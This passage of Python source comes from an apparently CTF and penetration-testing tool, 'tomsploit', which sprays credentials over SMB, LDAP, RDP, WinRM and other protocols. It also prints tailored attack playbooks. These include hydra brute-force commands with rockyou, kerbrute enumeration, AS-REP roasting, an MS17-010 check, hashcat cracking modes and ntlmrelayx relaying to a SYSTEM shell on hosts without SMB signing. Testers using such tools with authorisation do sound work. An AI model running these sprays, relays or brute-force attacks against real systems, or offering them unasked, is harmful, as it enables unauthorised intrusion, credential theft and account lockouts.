    stdout for the final report lives here. (Live progress + ⚡ hit lines
    stay in TomSploit because they need the progress lock.)"""

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.quiet = cfg.quiet
        self.verbose = cfg.verbose

    # ── scan-time framing ─
    def banner(self) -> None:
        if self.quiet:
            return
        cfg = self.cfg
        proto_label = ("all" if len(cfg.protocols) == len(ALL_PROTOCOLS)
                       else ",".join(cfg.protocols))
        n_creds = self._cred_count()
        total = (n_creds * (len(cfg.protocols)
                 + sum(1 for p in cfg.protocols if p in LOCAL_AUTH_PROTOCOLS))
                 * len(cfg.targets))
        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}⚡ tomsploit{RESET}  "
              f"{DIM}nxc triage → valid creds + next commands (enum only){RESET}")
        print(f"{'═' * BANNER_WIDTH}")
        print(f"  Targets         {DIM}│{RESET} {BOLD}{len(cfg.targets):<11}{RESET} "
              f"Protocols {DIM}│{RESET} {BOLD}{proto_label}{RESET}")
        print(f"  Users           {DIM}│{RESET} {BOLD}{len(cfg.users):<11}{RESET} "
              f"Workers   {DIM}│{RESET} {BOLD}{cfg.workers}{RESET}")
        if cfg.paired:
            np = sum(1 for p in cfg.passwords if p)
            nh = sum(1 for h in cfg.hashes if h)
        else:
            np, nh = len(cfg.passwords), len(cfg.hashes)
        cred_label = f"{np}p / {nh}h"
        print(f"  Credentials     {DIM}│{RESET} {BOLD}{cred_label:<11}{RESET} "
              f"Timeout   {DIM}│{RESET} {BOLD}{NETEXEC_TIMEOUT}s{RESET}/attempt")
        if cfg.paired:
            print(f"  Pairing         {DIM}│{RESET} {BOLD}positional{RESET} "
                  f"{DIM}(user[i] ↔ secret[i], no cross-spray){RESET}")
        if cfg.log_file:
            print(f"  Log file        {DIM}│{RESET} {BOLD}{cfg.log_file}{RESET}")
        if cfg.creds_file:
            print(f"  Creds output    {DIM}│{RESET} {BOLD}{cfg.creds_file}{RESET}")
        if cfg.kerberos:
            print(f"  Auth method     {DIM}│{RESET} {BOLD}Kerberos cache{RESET}")
        print(f"  Total attempts  {DIM}│{RESET} {BOLD}{total}{RESET}")
        print(f"{'═' * BANNER_WIDTH}\n")

    def _cred_count(self) -> int:
        cfg = self.cfg
        if cfg.kerberos:
            return len(cfg.users)
        if cfg.paired:
            # one attempt per non-empty positional secret (combo files leave
            # '' placeholders in the list they didn't populate)
            return sum(1 for p in cfg.passwords if p) + \
                   sum(1 for h in cfg.hashes if h)
        return len(cfg.users) * (len(cfg.passwords) + len(cfg.hashes))

    def target_header(self, target: str) -> None:
        print(f"  {GREEN}{BOLD}► {target}{RESET}")

    def no_open_ports(self) -> None:
        print(f"    {RED}✘ No open ports — skipping.{RESET}\n")

    def port_probe(self, result: TargetResult) -> None:
        if self.quiet or not result.closed_protocols:
            return
        n_open = len(result.open_protocols)
        n_total = n_open + len(result.closed_protocols)
        skipped = ", ".join(p.upper() for p in result.closed_protocols)
        print(f"    {DIM}↳ Port probe: {n_open}/{n_total} open · "
              f"skipping {skipped}{RESET}\n")

    # ── per-target results block ─
    #
    # Verbosity model (default flips the old behavior — clean is free):
    #   -q  quiet    : Results box hidden entirely; only credential alarms
    #                  (lockout / expired / real errors) leak through, plus
    #                  the headline VALID CREDENTIALS + suggestions sections.
    #   (default)    : box shown; ordinary "wrong password" failures collapse
    #                  to a one-line per-protocol rollup; successes, timeouts,
    #                  and meaningful failures always print.
    #   -v  verbose  : every parsed line, including each wrong-password [-].

    @staticmethod
    def _partition(lines: list[tuple[str, str]]) -> dict:
        """Split a protocol's parsed lines into buckets the renderer needs."""
        out = {"plus": [], "skip": [], "ordinary": [],
               "valid_but": [], "alert": [], "error": [], "verify": []}
        for marker, msg in lines:
            if marker == "[+]":
                out["plus"].append(msg)
            elif marker == "[?]":
                out["verify"].append(msg)
            elif marker == "[!]":
                out["skip"].append(msg)
            elif marker == "[-]":
                out[classify_failure(msg)].append(msg)
        return out

    @staticmethod
    def _icon(parts: dict) -> str:
        if parts["plus"]:
            return f"{GREEN}✔{RESET}"
        if parts["verify"]:
            return f"{YELLOW}?{RESET}"
        if parts["valid_but"]:
            return f"{YELLOW}⚠{RESET}"
        if parts["error"]:
            return f"{RED}✘{RESET}"
        if parts["alert"]:
            return f"{YELLOW}⚠{RESET}"
        if parts["skip"]:
            return f"{YELLOW}⏱{RESET}"
        return f"{RED}✘{RESET}"

    def protocol_results(self, result: TargetResult) -> None:
        # Quiet: skip the whole box, but never swallow an alarm.
        if self.quiet:
            self._quiet_alarms(result)
            return

        ip_tag = (f" {DIM}({result.real_ip}){RESET}"
                  if result.real_ip and result.real_ip != result.target else "")
        dc_tag = f" {YELLOW}{BOLD}[DC]{RESET}" if result.is_dc else ""
        elapsed_tag = (f" {DIM}[{result.elapsed:.1f}s]{RESET}"
                       if result.elapsed > 0 else "")

        print(f"\n{'─' * BANNER_WIDTH}")
        print(f"  {CYAN}{BOLD}📋 Results{RESET}{ip_tag}{dc_tag}{elapsed_tag}")
        print(f"{'─' * BANNER_WIDTH}")

        if result.target_info:
            print(f"    {DIM}{result.target_info}{RESET}")
        if result.smb_signing is False:
            print(f"    {YELLOW}{BOLD}⚡ SMB signing: not required{RESET} "
                  f"{YELLOW}— host is NTLM-relay-able{RESET}")
        print()

        # Anonymous SMB (single attempt — only render if it actually shows
        # something, otherwise a lone "access denied" is just noise).
        if result.anon_smb_lines:
            anon_parsed = [(m, msg) for m, msg in
                           (parse_nxc_line(l) for l in result.anon_smb_lines)
                           if m in ("[+]", "[-]", "[!]")]
            self._print_proto_block("SMB (anon)", anon_parsed, anon=True)

        # Per-protocol blocks (canonical order)
        quiet_protos: list[str] = []
        for proto in ALL_PROTOCOLS:
            for local in (False, True):
                scope = "local" if local else "domain"
                lines = result.protocol_lines.get(f"{proto}-{scope}")
                if not lines:
                    continue
                label = f"{proto.upper()} ({scope})"
                parts = self._partition(lines)
                if not any(parts[k] for k in
                           ("plus", "skip", "ordinary", "valid_but",
                            "alert", "error", "verify")):
                    quiet_protos.append(label)
                    continue
                # Pure wrong-password protocol → one rollup line (not a block),
                # unless -v wants the detail.
                only_ordinary = (parts["ordinary"] and not parts["plus"]
                                 and not parts["skip"] and not parts["valid_but"]
                                 and not parts["alert"] and not parts["error"]
                                 and not parts["verify"])
                if only_ordinary and not self.verbose:
                    n = len(parts["ordinary"])
                    print(f"  {RED}✘{RESET} {BOLD}{label:<20}{RESET} "
                          f"{DIM}{n} attempt{'s' if n != 1 else ''}, "
                          f"all failed{RESET}")
                    continue
                self._print_proto_block(label, lines)

        if quiet_protos:
            print(f"\n  {DIM}── Not answering / no data: "
                  f"{', '.join(quiet_protos)}{RESET}")
        print(f"\n{'─' * BANNER_WIDTH}")

    def _print_proto_block(self, label: str, lines: list[tuple[str, str]],
                           anon: bool = False) -> None:
        """Render one protocol's lines. Ordinary failures print only under
        -v; successes, timeouts, and meaningful failures always print. If
        nothing qualifies (e.g. a lone denied anon attempt in clean mode),
        prints nothing at all."""
        parts = self._partition(lines)
        icon = self._icon(parts)
        hidden = len(parts["ordinary"]) if not self.verbose else 0

        # Decide whether there's anything to show.
        showable = (parts["plus"] or parts["skip"] or parts["valid_but"]
                    or parts["alert"] or parts["error"] or parts["verify"]
                    or (self.verbose and parts["ordinary"]))
        if not showable:
            return

        first = True

        def emit(text: str) -> None:
            nonlocal first
            prefix = (f"  {icon} {BOLD}{label:<20}{RESET}" if first
                      else f"      {'':<20}")
            first = False
            print(f"{prefix} {text}")

        for msg in parts["plus"]:
            emit(f"{YELLOW if anon else GREEN}{msg}{RESET}")
        for msg in parts["verify"]:
            emit(f"{YELLOW}{msg}{RESET} {DIM}← unexpected [+] format, "
                 f"verify manually{RESET}")
        for msg in parts["valid_but"]:
            emit(f"{YELLOW}{BOLD}{msg}{RESET} {YELLOW}← creds valid, "
                 f"can't use as-is{RESET}")
        for msg in parts["alert"]:
            emit(f"{YELLOW}{msg}{RESET}")
        for msg in parts["error"]:
            emit(f"{RED}{msg}{RESET}")
        if self.verbose:
            for msg in parts["ordinary"]:
                emit(f"{DIM}{msg}{RESET}")
        for msg in parts["skip"]:
            emit(f"{YELLOW}{msg}{RESET}")

        if hidden:
            emit(f"{DIM}(+{hidden} failed attempt"
                 f"{'s' if hidden != 1 else ''} hidden — -v to show){RESET}")

    def _quiet_alarms(self, result: TargetResult) -> None:
        """Under -q, surface only credential alarms — lockout, expired/valid,
        and real errors — so the minimal view never hides a tactic-changer."""
        alarms: list[tuple[str, str, str]] = []  # (label, kind, msg)
        for proto in ALL_PROTOCOLS:
            for local in (False, True):
                scope = "local" if local else "domain"
                lines = result.protocol_lines.get(f"{proto}-{scope}")
                if not lines:
                    continue
                parts = self._partition(lines)
                label = f"{proto.upper()} ({scope})"
                for msg in parts["valid_but"]:
                    alarms.append((label, "valid_but", msg))
                for msg in parts["verify"]:
                    alarms.append((label, "verify", msg))
                for msg in parts["alert"]:
                    alarms.append((label, "alert", msg))
                for msg in parts["error"]:
                    alarms.append((label, "error", msg))
        if not alarms:
            return
        print(f"\n  {YELLOW}{BOLD}⚠ Notable{RESET}")
        for label, kind, msg in alarms:
            color = YELLOW if kind in ("valid_but", "alert", "verify") else RED
            if kind == "valid_but":
                tag = " ← creds valid, can't use as-is"
            elif kind == "verify":
                tag = " ← unexpected [+] format, verify manually"
            else:
                tag = ""
            print(f"    {color}{label:<20}{RESET} {color}{msg}{RESET}"
                  f"{YELLOW}{tag}{RESET}")

    # ── valid-credentials section (the headline) ─
    def valid_section(self, result: TargetResult) -> None:
        has_anything = (result.successes or result.guests
                        or result.anon_smb or result.anon_ldap)
        if not has_anything:
            # Keep the blunt one-liner, then the tailored "where to go" block.
            print(f"\n  {RED}{BOLD}✗ No valid credentials found.{RESET}")
            self.no_access(result)
            print(f"{'═' * BANNER_WIDTH}\n")
            return

        ip = result.real_ip or result.target
        if result.anon_smb:
            self._anon_smb(ip)
        if result.anon_ldap:
            self._anon_ldap(result, ip)
        if result.successes:
            self._valid_creds(result)
        if result.guests:
            self._guests(result)
        if result.successes:
            self._suggestions(result)
        print(f"{'═' * BANNER_WIDTH}\n")

    def no_access(self, result: TargetResult) -> None:
        """Tailored 'you're stuck' guidance, keyed off which ports were open.
        Scoped to tomsploit's lane — credential acquisition + the no-cred AD
        playbook — and defers service-level enumeration to tombuster so the
        two tools don't print the same recipes.

        Anti-duplication with Next Steps: when this host is a confident DC,
        the username-harvest / AS-REP specifics live in the Next Steps section
        (printed once, after all targets), so here we only point at them."""
        target = result.real_ip or result.target
        openp = set(result.open_protocols)
        dom = result.domain or "<DOMAIN>"
        is_ad = result.is_dc or ("ldap" in openp)

        print(f"\n  {CYAN}{BOLD}🧭 No access yet — where to go next{RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")

        # 1) Universal: the credential set is the problem (every attempt failed
        #    by definition). Widening it beats re-spraying.
        print(f"\n    {BOLD}Widen your creds — don't just re-spray:{RESET}")
        print(f"        {DIM}# creds hide in: web logins & page source, readable{RESET}")
        print(f"        {DIM}# FTP/NFS files, SNMP strings, config/backup files,{RESET}")
        print(f"        {DIM}# and reuse across hosts. A hash that failed here may{RESET}")
        print(f"        {DIM}# work elsewhere — feed it back in:{RESET}")
        print(f"        tomsploit -t <other-host> -u users.txt -H <ntlm-hash>")

        # 2) AD with no foothold — username list is usually the gap.
        if is_ad:
            print(f"\n    {BOLD}AD detected — usually the username list is what's "
                  f"missing:{RESET}")
            if result.is_dc:
                print(f"        {DIM}# kerbrute / RID-brute / AS-REP are in the "
                      f"Next Steps section below{RESET}")
                if "ldap" in openp:
                    print()
                    print(f"        {DIM}# also pull users from anonymous LDAP{RESET}")
                    print(f"        nxc ldap {target} -u '' -p '' --users")
            else:
                print(f"        {DIM}# build a username list{RESET}")
                print(f"        kerbrute userenum --dc {target} -d {dom} "
                      f"/usr/share/seclists/Usernames/Names/names.txt")
                if "ldap" in openp:
                    print()
                    print(f"        {DIM}# pull users from anonymous LDAP{RESET}")
                    print(f"        nxc ldap {target} -u '' -p '' --users")
                print()
                print(f"        {DIM}# AS-REP roast the list — no creds needed{RESET}")
                print(f"        impacket-GetNPUsers {dom}/ -dc-ip {target} -request "
                      f"-no-pass -usersfile users.txt -format hashcat "
                      f"-outputfile asrep.hash")
                if "smb" in openp:
                    print()
                    print(f"        {DIM}# enumerate users over null/guest SMB{RESET}")
                    print(f"        nxc smb {target} -u '' -p '' --rid-brute")

        # 3) SMB open — guest fallback + the classic no-cred exploit check.
        if "smb" in openp:
            print(f"\n    {BOLD}SMB beyond the null session:{RESET}")
            print(f"        {DIM}# null denied? try guest, then a broad sweep{RESET}")
            print(f"        nxc smb {target} -u guest -p '' --shares")
            print(f"        enum4linux-ng -A {target}")
            print()
            print(f"        {DIM}# no-cred exploit check (older boxes): MS17-010{RESET}")
            print(f"        nxc smb {target} -u '' -p '' -M ms17-010")

        # 3.5) Brute-force the login: the cred SET failed, so escalate from
        #      spraying a known set to a wordlist. hydra owns this — tomsploit
        #      doesn't brute. Lockout-aware: SSH/FTP are usually local accounts
        #      (safe); RDP/SMB on a DC can lock (see the warning before the spray).
        print(f"\n    {BOLD}Brute-force the login (cred set failed → wordlist):{RESET}")
        wl = "/usr/share/wordlists/rockyou.txt"
        for p in ("ssh", "ftp"):
            if p in openp:
                print(f"        {DIM}# {p.upper()} — usually local accounts, lockout-safe{RESET}")
                print(f"        hydra -L users.txt -P {wl} {p}://{target}")
        if "rdp" in openp:
            print(f"        {DIM}# RDP — AD accounts can LOCK; check the policy first{RESET}")
            print(f"        hydra -L users.txt -P {wl} rdp://{target}")
        if "mssql" in openp:
            print(f"        {DIM}# MSSQL logins{RESET}")
            print(f"        hydra -L users.txt -P {wl} mssql://{target}")
        if "vnc" in openp:
            print(f"        {DIM}# VNC — password only{RESET}")
            print(f"        hydra -P {wl} vnc://{target}")
        # Generic web login form (tomsploit doesn't probe web — fill these in).
        print(f"        {DIM}# web login form (80/443) — set the path, fields & FAIL string:{RESET}")
        print(f"        hydra -L users.txt -P {wl} {target} http-post-form \\")
        print(f"          {DIM}\"/login.php:username=^USER^&password=^PASS^:F=Invalid credentials\"{RESET}")
        if "smb" in openp or "winrm" in openp:
            print(f"        {DIM}# SMB/WinRM: brute with nxc (better than hydra) — but on a DC{RESET}")
            print(f"        {DIM}# this LOCKS accounts, so read the policy first:{RESET}")
            print(f"        nxc smb {target} -u '' -p '' --pass-pol")
            print(f"        nxc smb {target} -u users.txt -p {wl}   {DIM}# only if lockout allows{RESET}")

        # 4) Maybe it isn't a credential box. Famous no-cred angles for the
        #    cred-services present, then hand service enumeration to tombuster.
        print(f"\n    {BOLD}Maybe it's not a credential box at all:{RESET}")
        if "rdp" in openp:
            print(f"        {DIM}# RDP version → BlueKeep (CVE-2019-0708){RESET}")
            print(f"        nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption "
                  f"{target}")
        if "mssql" in openp:
            print(f"        {DIM}# MSSQL: try a blank 'sa' before assuming you "
                  f"need creds{RESET}")
            print(f"        impacket-mssqlclient sa:''@{target}")
        print(f"        {DIM}# service versions, web, and CVE checks live in "
              f"tombuster:{RESET}")
        print(f"        tombuster -t {target}")

    # ── pre-spray account-lockout warning ─
    def _attempts_per_user(self) -> int:
        """How many failed logons each account could rack up this run."""
        if self.cfg.kerberos:
            return 0
        if self.cfg.paired:
            return 1
        return len(self.cfg.passwords) + len(self.cfg.hashes)

    def lockout_warning(self, result: TargetResult) -> None:
        """Warn (before the spray) about the account-lockout policy read over
        an anonymous session. Shown even under -q — it's a safety alarm, and
        it never blocks the spray (warn-only)."""
        if not result.lockout_checked:
            return
        th = result.lockout_threshold
        attempts = self._attempts_per_user()
        if th is None:
            print(f"  {DIM}🔒 Lockout policy not readable anonymously — spray "
                  f"with care (threshold unknown).{RESET}")
            return
        if th == 0:
            print(f"  {GREEN}🔓 Lockout threshold disabled (0) — safe to spray."
                  f"{RESET}")
            return
        win = f", resets after {result.lockout_window}" if result.lockout_window else ""
        sev = RED if attempts and attempts >= th else YELLOW
        print(f"  {sev}{BOLD}🔒 ACCOUNT LOCKOUT RISK{RESET} {sev}— threshold "
              f"{th} bad attempts{win}.{RESET}")
        if attempts and attempts >= th:
            print(f"  {sev}   ~{attempts} secret(s)/user this run WILL lock "
                  f"accounts. Trim to ≤{th - 1} passwords, or use --paired.{RESET}")
        elif attempts:
            print(f"  {DIM}   ~{attempts} secret(s)/user this run (under the "
                  f"threshold), but failed re-runs accumulate within the window."
                  f"{RESET}")

    def _anon_smb(self, ip: str) -> None:
        print(f"\n  {CYAN}{BOLD}💡 Anonymous SMB — Suggested Next Steps{RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        for i, (label, tmpl) in enumerate(ANON_SMB_COMMANDS):
            if i > 0:
                print()
            print(f"        {DIM}# {label}{RESET}")
            print(f"        {tmpl.format(ip=ip)}")
        print()

    def _anon_ldap(self, result: TargetResult, ip: str) -> None:
        dom = result.domain or "<DOMAIN>"
        print(f"\n  {CYAN}{BOLD}💡 Anonymous LDAP — Users Enumerated{RESET}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        users = result.anon_ldap_users
        if users:
            has_desc = [u for u in users if u.get("description")]
            no_desc = [u for u in users if not u.get("description")]
            if has_desc:
                print(f"\n    {YELLOW}{BOLD}⚠ Users with descriptions "
                      f"(check for passwords!):{RESET}\n")
                for u in has_desc:
                    print(f"    {YELLOW}►{RESET} {BOLD}{u['user']:<24}{RESET} "
                          f"{DIM}│{RESET} {YELLOW}{u['description']}{RESET}")
                print()
            if no_desc:
                names = ", ".join(u["user"] for u in no_desc)
                print(f"    {DIM}Other users: {names}{RESET}\n")
            print(f"        {DIM}# save usernames for spraying / roasting{RESET}")
            print(f"        echo '{chr(10).join(u['user'] for u in users)}' > users.txt")
            print()
            print(f"        {DIM}# AS-REP roast with NO creds (just usernames){RESET}")
            print(f"        impacket-GetNPUsers {dom}/ -dc-ip {ip} -request "
                  f"-no-pass -usersfile users.txt -format hashcat "
                  f"-outputfile asrep.hash")
            print()
        print(f"        {DIM}# just usernames via nxc{RESET}")
        print(f"        nxc ldap {ip} -u '' -p '' --users")
        print()
        print(f"        {DIM}# full anonymous dump{RESET}")
        print(f"        nxc ldap {ip} -u '' -p '' --query \"(objectClass=*)\" \"\"")
        print()

    def _valid_creds(self, result: TargetResult) -> None:
        ordered = sorted(result.successes, key=success_sort_key)
        print(f"\n  {GREEN}{BOLD}✓ VALID CREDENTIALS{RESET}\n")
        for s in ordered:
            badge = f" {YELLOW}[admin]{RESET}" if s.is_admin else ""
            print(f"    {GREEN}►{RESET} {BOLD}{s.label:<20}{RESET} "
                  f"{DIM}│{RESET} {s.raw_message}{badge}")
        print()

    def _guests(self, result: TargetResult) -> None:
        print(f"  {YELLOW}{BOLD}⚠ GUEST MAPPING — likely not real auth{RESET}")
        print(f"  {DIM}Samba's `map to guest = bad user` accepts any creds "
              f"and downgrades to guest.{RESET}")
        print(f"  {DIM}Treat as info disclosure, not a working login.{RESET}\n")
        for s in result.guests:
            print(f"    {YELLOW}►{RESET} {BOLD}{s.label:<20}{RESET} "
                  f"{DIM}│{RESET} {s.raw_message}")
        print()
        # Guest still reads guest-accessible shares — enumerate exactly like a
        # null session. Skip if the anonymous-SMB block already printed these.
        if not result.anon_smb:
            ip = result.real_ip or result.target
            print(f"  {CYAN}{BOLD}💡 Guest SMB — read what guest can reach{RESET}")
            print(f"  {'─' * (BANNER_WIDTH - 2)}")
            for i, (label, tmpl) in enumerate(ANON_SMB_COMMANDS):
                if i > 0:
                    print()
                print(f"        {DIM}# {label}{RESET}")
                print(f"        {tmpl.format(ip=ip)}")
            print(f"\n        {DIM}# a readable share with a config/backup is the "
                  f"usual win — grep it for creds, then reuse them (spray everywhere){RESET}")
            print()

    def _suggestions(self, result: TargetResult) -> None:
        # One block per DISTINCT credential (protocol + auth + scope + user),
        # so two different accounts that both authenticate on the same
        # protocol — e.g. a domain user and a local admin on SMB — each get
        # their own command set. Only genuine duplicates collapse.
        seen: set[tuple] = set()
        blocks: list[tuple[Success, list[tuple[str, str]]]] = []
        for s in sorted(result.successes, key=success_sort_key):
            key = (s.protocol, s.auth_type, s.local_auth,
                   s.domain.lower(), s.user.lower())
            if key in seen:
                continue
            seen.add(key)
            try:
                entries = build_suggestions(
                    s, result.real_ip or result.target, result.hostname,
                    result.is_dc)
            except Exception as exc:
                entries = [("error", f"# suggestion builder failed: "
                            f"{exc.__class__.__name__}: {exc}")]
            if entries:
                blocks.append((s, entries))

        if not blocks:
            return

        dc_tag = f" {YELLOW}[DC]{RESET}" if result.is_dc else ""
        print(f"  {CYAN}{BOLD}💡 Suggested Commands{RESET}{dc_tag}")
        print(f"  {'─' * (BANNER_WIDTH - 2)}")
        for s, entries in blocks:
            header = f"[{s.protocol.upper()}"
            if s.auth_type == AuthType.HASH:
                header += " · PtH"
            elif s.auth_type == AuthType.KERBEROS:
                header += " · Kerberos"
            who = f"{s.domain}\\{s.user}" if s.domain else s.user
            header += f" · {who}"
            if s.local_auth:
                header += " · local"
            header += "]"
            print(f"\n    {GREEN}►{RESET} {BOLD}{header}{RESET}")
            for i, (label, cmd) in enumerate(entries):
                if i > 0:
                    print()
                if i == 0:
                    print(f"        {YELLOW}# ★ {label}{RESET}")
                else:
                    print(f"        {DIM}# {label}{RESET}")
                for ln in cmd.split("\n"):
                    print(f"        {ln.rstrip()}")
        print()

    # ── run-level summaries ─
    def summary(self, results: list[TargetResult]) -> None:
        if len(results) <= 1:
            return
        n_win = sum(1 for r in results
                    if r.successes or r.anon_smb or r.anon_ldap)
        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}📊 Summary{RESET}  {DIM}({len(results)} targets){RESET}")
        print(f"{'═' * BANNER_WIDTH}")
        for r in results:
            ok = r.successes or r.anon_smb or r.anon_ldap
            icon = f"{GREEN}✔{RESET}" if ok else f"{RED}✘{RESET}"
            host = r.target
            if r.hostname:
                host += f" {DIM}({r.hostname}){RESET}"
            if r.is_dc:
                host += f" {YELLOW}[DC]{RESET}"
            n_creds = (len(r.successes) + (1 if r.anon_smb else 0)
                       + (1 if r.anon_ldap else 0))
            cred_tag = (f" {GREEN}{n_creds} cred{'s' if n_creds != 1 else ''}{RESET}"
                        if n_creds else "")
            time_tag = f" {DIM}[{r.elapsed:.1f}s]{RESET}"
            skip_tag = (f" {DIM}({r.skipped_reason}){RESET}"
                        if not r.scanned else "")
            print(f"  {icon} {host}{cred_tag}{time_tag}{skip_tag}")
        print(f"\n  Total: {GREEN}{BOLD}{n_win}{RESET}/{len(results)} "
              f"targets with credentials")
        print(f"{'═' * BANNER_WIDTH}\n")

    def next_steps(self, results: list[TargetResult]) -> None:
        if self.quiet:
            return
        # Group DCs by domain so per-domain commands are emitted once.
        dcs_by_domain: dict[str, list[tuple[str, str]]] = {}
        for r in results:
            if r.is_dc and r.real_ip:
                key = r.domain or "<DOMAIN>"
                dcs_by_domain.setdefault(key, []).append(
                    (r.hostname or r.real_ip, r.real_ip))

        # Hosts with SMB signing off are NTLM-relay targets.
        relay_hosts = [(r.hostname or r.real_ip or r.target, r.real_ip or r.target)
                       for r in results if r.smb_signing is False]

        has_dcs = bool(dcs_by_domain)
        has_relay = bool(relay_hosts)
        has_files = bool(self.cfg.creds_file or self.cfg.json_out or self.cfg.log_file)
        if not has_dcs and not has_relay and not has_files:
            return

        print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}🎯 Next Steps{RESET}")
        print(f"{'═' * BANNER_WIDTH}")

        if has_dcs:
            print(f"\n  {BOLD}Domain Controllers detected{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            for domain, hosts in dcs_by_domain.items():
                for hostname, ip in hosts:
                    suffix = (f" {DIM}—{RESET} {domain}"
                              if domain != "<DOMAIN>" else "")
                    print(f"    {YELLOW}►{RESET} {BOLD}{hostname}{RESET} "
                          f"{DIM}({ip}){RESET}{suffix}")

            print(f"\n  {BOLD}No-auth AD attacks{RESET} "
                  f"{DIM}(try alongside any creds found above){RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            first = True
            for domain, hosts in dcs_by_domain.items():
                if not first:
                    print()
                first = False
                dc_ip = hosts[0][1]
                dom = domain if domain != "<DOMAIN>" else "<DOMAIN>"
                print(f"        {DIM}# enumerate usernames — kerbrute{RESET}")
                print(f"        kerbrute userenum --dc {dc_ip} -d {dom} "
                      f"/usr/share/seclists/Usernames/Names/names.txt")
                print()
                print(f"        {DIM}# enumerate usernames — null-session RID brute{RESET}")
                print(f"        nxc smb {dc_ip} -u '' -p '' --rid-brute")
                print()
                print(f"        {DIM}# AS-REP roast — preauth disabled = free hash{RESET}")
                print(f"        impacket-GetNPUsers {dom}/ -dc-ip {dc_ip} "
                      f"-request -no-pass -usersfile users.txt")

            print(f"\n  {BOLD}Cracking captured hashes{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            crack = (
                ("AS-REP (Kerberos 5 AS-REP)", "18200", "asrep.hash"),
                ("Kerberoast (Kerberos 5 TGS-REP)", "13100", "kerb.hash"),
                ("NTDS / SAM (NTLM)", "1000", "ntds.hash"),
                ("NetNTLMv2 (responder / relay)", "5600", "netntlm.hash"),
            )
            for i, (label, mode, fname) in enumerate(crack):
                if i > 0:
                    print()
                print(f"        {DIM}# {label}{RESET}")
                print(f"        hashcat -m {mode} {fname} "
                      f"/usr/share/wordlists/rockyou.txt")

        if has_relay:
            print(f"\n  {BOLD}SMB signing off — NTLM relay targets{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            for hostname, ip in relay_hosts:
                print(f"    {YELLOW}►{RESET} {BOLD}{hostname}{RESET} "
                      f"{DIM}({ip}){RESET}")
            targets_file = "relay-targets.txt"
            ips = " ".join(ip for _, ip in relay_hosts)
            print(f"\n        {DIM}# save the relay targets{RESET}")
            print(f"        printf '%s\\n' {ips} > {targets_file}")
            print(f"\n        {DIM}# capture + relay hashes (run responder with "
                  f"SMB/HTTP off first){RESET}")
            print(f"        impacket-ntlmrelayx -tf {targets_file} -smb2support")
            print(f"\n        {DIM}# relay straight to a SYSTEM shell on a target{RESET}")
            print(f"        impacket-ntlmrelayx -t smb://{relay_hosts[0][1]} "
                  f"-smb2support -i")
            print(f"\n        {DIM}# then trigger auth (coerce) toward your relay host{RESET}")
            print(f"        # e.g. PetitPotam / PrinterBug / a clicked UNC path")

        if has_files:
            print(f"\n  {BOLD}Output files{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            if self.cfg.creds_file:
                print(f"    {DIM}Valid creds (TSV):{RESET}  {self.cfg.creds_file}")
            if self.cfg.json_out:
                print(f"    {DIM}JSON results:     {RESET}  {self.cfg.json_out}")
            if self.cfg.log_file:
                print(f"    {DIM}scan log:         {RESET}  {self.cfg.log_file}")

        print(f"\n{'═' * BANNER_WIDTH}\n")


# ─── Input handling ────────────────────────────────────────────────────

_NT_HEX = re.compile(r"^[0-9a-fA-F]{32}$")
_LM_NT = re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$")


def looks_like_ntlm(secret: str) -> bool:
    """True if the secret is an NTLM hash: 32 hex chars (NT) or LM:NT."""
    s = secret.strip()
    return bool(_NT_HEX.match(s) or _LM_NT.match(s))


def parse_combo_file(path: str) -> tuple[list[str], list[str], list[str], list[str]]:
    """Parse a combined 'user:secret' file into positionally-aligned lists.

    Each line is 'user:secret'. The secret is auto-classified: an NTLM hash
    (32 hex, or LM:NT) goes to hashes, anything else is treated as a password.
    Splitting on the FIRST colon only, so passwords may contain ':'.

    Returns (users, passwords, hashes, warnings) where users[i] aligns with
    whichever of passwords/hashes that line populated; the other list gets ''
    as a placeholder so all three stay the same length and paired zip works.
    """
    if not os.path.isfile(path):
        raise ValueError(f"--combo expects a file; '{path}' not found.")
    users: list[str] = []
    passwords: list[str] = []
    hashes: list[str] = []
    warnings: list[str] = []
    try:
        with open(path) as f:
            lines = [ln.rstrip("\n") for ln in f]
    except OSError as exc:
        raise ValueError(f"Cannot read '{path}': {exc}") from exc

    for n, raw in enumerate(lines, 1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            warnings.append(f"line {n}: no ':' separator, skipped ({line!r})")
            continue
        user, secret = line.split(":", 1)
        user = user.strip()
        if not user:
            warnings.append(f"line {n}: empty username, skipped")
            continue
        users.append(user)
        if looks_like_ntlm(secret):
            hashes.append(secret.strip())
            passwords.append("")
        else:
            passwords.append(secret)
            hashes.append("")
    return users, passwords, hashes, warnings


def read_value_or_file(source: str) -> list[str]:
    if os.path.isfile(source):
        try:
            with open(source) as f:
                return [line.strip() for line in f if line.strip()]
        except OSError as exc:
            raise ValueError(f"Cannot read '{source}': {exc}") from exc
    return [source]


def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
    """Expand IPs, hostnames, and CIDRs into a deduplicated, order-preserved
    list of hosts."""
    out: list[str] = []
    seen: set[str] = set()
    for raw in specs:
        spec = raw.strip()
        if not spec:
            continue
        if "/" in spec:
            try:
                net = ipaddress.ip_network(spec, strict=False)
            except ValueError:
                if spec not in seen:
                    seen.add(spec); out.append(spec)
                continue
            if net.num_addresses > max_hosts:
                raise ValueError(
                    f"{spec} expands to {net.num_addresses} hosts "
                    f"(cap: {max_hosts}). Raise with --max-cidr-hosts."
                )
            hosts = ([net.network_address] if net.num_addresses == 1
                     else list(net.hosts()))
            for h in hosts:
                addr = str(h)
                if addr not in seen:
                    seen.add(addr); out.append(addr)
        else:
            if spec not in seen:
                seen.add(spec); out.append(spec)
    return out


